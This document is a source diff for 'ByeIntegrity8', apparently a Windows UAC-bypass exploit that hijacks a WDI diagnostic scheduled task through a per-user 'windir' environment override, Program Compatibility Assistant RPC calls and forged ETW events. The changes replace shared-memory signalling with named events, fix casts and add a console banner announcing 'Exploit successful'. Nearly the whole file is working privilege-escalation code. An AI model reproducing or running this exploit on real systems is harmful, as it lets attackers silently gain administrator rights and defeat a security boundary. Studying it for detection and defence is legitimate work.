@@ -16,9 +16,9 @@ const VARIANT VARIANT_VAL = { {{VT_NULL, 0}} };
 const GUID AE_LOG = { 0x0EEF54E71, 0x661, 0x422D, {0x9A, 0x98, 0x82, 0xFD, 0x49, 0x40, 0xB8, 0x20} };
 const ULONG ZERO_VALUE = 0;
 const EVENT_DATA_DESCRIPTOR AE_EVENT_DESCRIPTOR[3] = {
-	{&ZERO_VALUE, sizeof(ULONG)},
-	{&ZERO_VALUE, sizeof(ULONG)},
-	{NULL, 0}
+	{(ULONGLONG)(ULONG_PTR)&ZERO_VALUE, sizeof(ULONG)},
+	{(ULONGLONG)(ULONG_PTR)&ZERO_VALUE, sizeof(ULONG)},
+	{(ULONGLONG)(ULONG_PTR)NULL, 0}
 };
 
 EVENT_DESCRIPTOR MessageBoxEvent = {
@@ -57,6 +57,20 @@ EVENT_DESCRIPTOR MessageBoxEvent = {
 		PWSTR workingDir,		// working directory of program to be monitored, no trailing backslash
 		ULONG flags				// set of flags to modify monitoring behavior
 	);	*/
+
+/* RAiNotifyUserCallbackExceptionProcess
+* RPC call used in Windows 7 to tell PCA that an unhandled exception
+* has occured during a user callback. PCA will launch the DM after the process
+* exits or after 10 seconds of being called, whichever comes first. Returns
+* standard system error code.
+* 
+* Usually this function is called from PcaSvc itself via NdrServerCall[All][2]. */
+
+/*	long RAiNotifyUserCallbackExceptionProcess(
+		wchar_t* exePathName,	// full path name to program executable file
+		long unknown0,			// always set to 1
+		long processId			// process ID for PcaSvc to use
+	); */
 
 /* Writes an event's information without registering its provider
    Definition taken from Geoff Chappell's website */
@@ -178,22 +192,28 @@ int BiTriggerMain(
 )
 {
 	ULONG win32Status;
-	EtwEventWriteNoRegistrationPtr EtwEventWriteNoRegistration =
-		(EtwEventWriteNoRegistrationPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "EtwEventWriteNoRegistration");
+	EtwEventWriteNoRegistrationPtr EtwEventWriteNoRegistration;
+	HMODULE hModule;
 
-	if (!EtwEventWriteNoRegistration)
-		return EXIT_FAILURE;
+	hModule = GetModuleHandleW(L"ntdll.dll");
+	if (hModule) {
+		EtwEventWriteNoRegistration = (EtwEventWriteNoRegistrationPtr)GetProcAddress(hModule, "EtwEventWriteNoRegistration");
+		if (!EtwEventWriteNoRegistration)
+			return (int)GetLastError();
+	}
+	else
+		return (int)GetLastError();
 
 	// write an event that PcaSvc will catch that indicates a version message box has been detected
-	win32Status = EtwEventWriteNoRegistration(&AE_LOG, &MessageBoxEvent,
-		3, &AE_EVENT_DESCRIPTOR);
+	win32Status = EtwEventWriteNoRegistration((LPGUID)&AE_LOG, &MessageBoxEvent,
+		3, (PEVENT_DATA_DESCRIPTOR)&AE_EVENT_DESCRIPTOR);
 	if (win32Status != ERROR_SUCCESS)
 		return win32Status;
 
 	MessageBoxEvent.Id = 0x1F48;
 	// write an event that PcaSvc will catch that indicates a message box with an error icon has been detected
-	win32Status = EtwEventWriteNoRegistration(&AE_LOG, &MessageBoxEvent,
-		3, &AE_EVENT_DESCRIPTOR);
+	win32Status = EtwEventWriteNoRegistration((LPGUID)&AE_LOG, &MessageBoxEvent,
+		3, (PEVENT_DATA_DESCRIPTOR)&AE_EVENT_DESCRIPTOR);
 
 	return win32Status;
 }
@@ -259,43 +279,34 @@ int wmain(
 	PWCHAR* argv
 )
 {
-	if (argv[0][0] == L'~')
+	if (argv[0][0] == L'0')
 		return BiTriggerMain();
-	if (argv[0][0] == L'L') {
+	if (argv[0][0] == L'1') {
 		Sleep(2000);
 		return 0;
 	}
-	if (argv[0][0] == L'S') {
+	if (argv[0][0] == L'2') {
 		HRESULT hr;
-		HANDLE hSharedMemory;
-		PUCHAR exeName = NULL;
+		HANDLE hEvent;
 
-		hSharedMemory = OpenFileMappingW(FILE_MAP_WRITE, FALSE, L"ByeIntegrity8");
-		if (!hSharedMemory) {
+		hEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"ByeIntegrity8Delete");
+		if (!hEvent) {
 			hr = HRESULT_FROM_WIN32(GetLastError());
 			goto end;
 		}
 
-		exeName = MapViewOfFile(hSharedMemory, FILE_MAP_WRITE, 0, 0, 0);
-		if (!exeName) {
-			hr = HRESULT_FROM_WIN32(GetLastError());
-			goto end;
-		}
-		
 		hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE |
 			COINIT_SPEED_OVER_MEMORY);
 		if (!SUCCEEDED(hr))
 			goto end;
 		
 		hr = BiStopWdiTask(FALSE);
-		*(PBOOLEAN)(exeName + sizeof(BOOLEAN)) = TRUE;
+		SetEvent(hEvent);
 		CoUninitialize();
 
-end:
-		if (exeName)
-			UnmapViewOfFile(exeName);
-		if (hSharedMemory)
-			CloseHandle(hSharedMemory);
+	end:
+		if (hEvent)
+			CloseHandle(hEvent);
 		return (int)hr;
 	}
 
@@ -316,7 +327,7 @@ end:
 	BOOLEAN taskHijacked = FALSE, usesPca = TRUE;
 	PUCHAR pSharedMem = NULL;
 	WCHAR exeName[MAX_PATH];
-	ULONG_PTR exeNameSize;
+	DWORD exeNameSize;
 	SIZE_T attrSize;
 	HANDLE explorer = NULL;
 	WCHAR keyName[9];
@@ -325,14 +336,24 @@ end:
 	RPC_BINDING_HANDLE pcaBinding = NULL;
 	RPC_STATUS rpcStatus;
 	long pcaResult;
+	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE), hHijackEvent = NULL, hDeleteEvent = NULL;
+
+	SetConsoleTextAttribute(hConsole, 8);
+	_putws(L" __________              .___        __                      .__  __             ______  \n" \
+		L" \\______   \\___.__. ____ |   | _____/  |_  ____   ___________|__|/  |_ ___.__.  /  __  \\ \n" \
+		L"  |    |  _<   |  |/ __ \\|   |/    \\   __\\/ __ \\ / ___\\_  __ \\  \\   __<   |  |  >      < \n" \
+		L"  |    |   \\\\___  \\  ___/|   |   |  \\  | \\  ___// /_/  >  | \\/  ||  |  \\___  | /   --   \\\n" \
+		L"  |______  // ____|\\___  >___|___|  /__|  \\___  >___  /|__|  |__||__|  / ____| \\______  /\n" \
+		L"         \\/ \\/         \\/         \\/          \\/_____/                 \\/             \\/ \n");
+	SetConsoleTextAttribute(hConsole, 7);
 
 	if (*(PULONG)0x7FFE026C == 6 && *(PULONG)0x7FFE0270 == 1) {
-		cmdLine[0] = L'L';
+		cmdLine[0] = L'1';
 		cmdLine[1] = L'\0';
 		usesPca = FALSE;
 	}
 	else {
-		cmdLine[0] = L'~';
+		cmdLine[0] = L'0';
 		cmdLine[1] = L'\0';
 	}
 
@@ -422,7 +443,7 @@ end:
 	}
 
 	hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
-		0, ((exeNameSize + 1) * sizeof(WCHAR)) + (sizeof(BOOLEAN) * 2), L"ByeIntegrity8");
+		0, (exeNameSize + 1) * sizeof(WCHAR), L"ByeIntegrity8");
 	if (!hSharedMem) {
 		wprintf(L"CreateFileMappingW() failed. Error: %lu\n", GetLastError());
 		goto eof;
@@ -433,7 +454,18 @@ end:
 		wprintf(L"MapViewOfFile() failed. Error: %lu\n", GetLastError());
 		goto eof;
 	}
-	memcpy(pSharedMem + (sizeof(BOOLEAN) * 2), exeName, (exeNameSize + 1) * sizeof(WCHAR));
+	memcpy(pSharedMem, exeName, ((ULONG_PTR)exeNameSize + 1) * sizeof(WCHAR));
+
+	hHijackEvent = CreateEventW(NULL, FALSE, FALSE, L"ByeIntegrity8Loaded");
+	if (!hHijackEvent) {
+		wprintf(L"CreateEventW() (0) failed. Error: %lu\n", GetLastError());
+		goto eof;
+	}
+	hDeleteEvent = CreateEventW(NULL, FALSE, FALSE, L"ByeIntegrity8Delete");
+	if (!hDeleteEvent) {
+		wprintf(L"CreateEventW() (1) failed. Error: %lu\n", GetLastError());
+		goto eof;
+	}
 
 	ZeroMemory(&si.StartupInfo, sizeof(STARTUPINFOW));
 	si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
@@ -512,7 +544,7 @@ end:
 
 	if (usesPca) {
 		__try {
-			pcaResult = RAiMonitorProcess(pcaBinding, processInfo.hProcess, 1,
+			pcaResult = RAiMonitorProcess(pcaBinding, (unsigned long long)processInfo.hProcess, 1,
 				exeName, cmdLine, curDir, PCA_MONITOR_PROCESS_NORMAL);
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER) {
@@ -551,15 +583,10 @@ end:
 		}
 	}
 
-	for (int i = 0; i <= 2000; ++i) {
-		if (*(PBOOLEAN)pSharedMem == TRUE) {
-			taskHijacked = TRUE;
-			break;
-		}
-		Sleep(10);
-	}
-	if (!taskHijacked)
+	if (WaitForSingleObject(hHijackEvent, 20000) == WAIT_TIMEOUT)
 		wprintf(L"Diagnostic module task did not launch & exit properly. HRESULT: %#010x\n", hr);
+	else
+		taskHijacked = TRUE;
 
 eofEarly:
 	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"windir");
@@ -574,15 +601,16 @@ eofEarly:
 			exeName);
 
 	if (taskHijacked) {
-		_putws(L">>> Exploit successful");
+		SetConsoleTextAttribute(hConsole, 15);
+		wprintf(L">>> ");
+		SetConsoleTextAttribute(hConsole, 14);
+		_putws(L"Exploit successful\n");
+		SetConsoleTextAttribute(hConsole, 7);
+
 		exitCode = 0;
 	}
-	for (int i = 0; i <= 2000; ++i) {
-		if (*(PBOOLEAN)(pSharedMem + sizeof(BOOLEAN)) == TRUE) {
-			break;
-		}
-		Sleep(10);
-	}
+
+	WaitForSingleObject(hDeleteEvent, 20000);
 
 eof:
 	if (pcaBinding)
@@ -593,6 +621,10 @@ eof:
 		CloseHandle(processInfo.hProcess);
 	if (explorer)
 		CloseHandle(explorer);
+	if (hDeleteEvent)
+		CloseHandle(hDeleteEvent);
+	if (hHijackEvent)
+		CloseHandle(hHijackEvent);
 	if (pSharedMem)
 		UnmapViewOfFile(pSharedMem);
 	if (hSharedMem)
